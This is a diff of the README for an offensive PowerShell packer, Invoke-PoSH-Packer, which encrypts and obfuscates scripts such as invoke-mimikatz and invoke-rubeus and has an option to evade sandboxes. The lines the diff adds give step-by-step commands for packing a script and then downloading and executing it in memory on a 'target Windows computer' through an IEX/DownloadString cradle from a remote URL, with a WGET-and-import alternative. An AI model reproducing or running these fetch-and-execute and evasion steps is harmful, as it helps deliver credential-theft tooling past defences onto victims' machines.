@@ -12,20 +12,27 @@
     - wait for 60 seconds before execution
   
 > Usage
-1. Example with a PowerShell script stored locally
+  - Step 1. Generate a packed & encrypted version of a PowerShell script (e.g. invoke-mimikatz.ps1, invoke-rubeus.ps1) stored locally or on a remote web server
 ```
-  - Import-Module ./Invoke-PoSH-Packer.ps1
-  - Invoke-PoSH-Packer -FilePath C:\path\script-to-pack.ps1 -OutFile C:\path\Packed-script.ps1 
-  --- or ---
-  - Invoke-PoSH-Packer -FilePath C:\path\script-to-pack.ps1 -OutFile C:\path\Packed-script.ps1 -sandbox
+PS C:\> Import-Module ./Invoke-PoSH-Packer.ps1
+PS C:\> Invoke-PoSH-Packer -FilePath C:\path\script-to-pack.ps1 -OutFile C:\path\Packed-script.ps1 
+--- or ---
+PS C:\> Invoke-PoSH-Packer -FilePath C:\path\script-to-pack.ps1 -OutFile C:\path\Packed-script.ps1 -sandbox
 ``` 
-2. Example with a PowerShell script stored on a remote web server
 ```
-  - Import-Module ./Invoke-PoSH-Packer.ps1
-  - Invoke-PoSH-Packer -FileUrl https://URL/script-to-pack.ps1 -OutFile C:\path\Packed-script.ps1  
-  --- or ---
-  - Invoke-PoSH-Packer -FileUrl https://URL/script-to-pack.ps1 -OutFile C:\path\Packed-script.ps1 -sandbox
+PS C:\> Import-Module ./Invoke-PoSH-Packer.ps1
+PS C:\> Invoke-PoSH-Packer -FileUrl https://URL/script-to-pack.ps1 -OutFile C:\path\Packed-script.ps1  
+--- or ---
+PS C:\> Invoke-PoSH-Packer -FileUrl https://URL/script-to-pack.ps1 -OutFile C:\path\Packed-script.ps1 -sandbox
 ```
+  - Step 2. Download & execute the packed & encrypted PowerShell script on a target Windows computer
+```
+PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://URL/Packed-script.ps1'); Invoke-method-of-your-original-script
+--- or ---
+PS C:\> WGET -URI https://URL/Packed-script.ps1 -OutFile C:\temp\Packed-script.ps1
+PS C:\> Import-Module C:\temp\Packed-script.ps1
+PS C:\> Invoke-method-of-your-original-script
+``` 
 
 > License
   - GNU General Public License v3.0
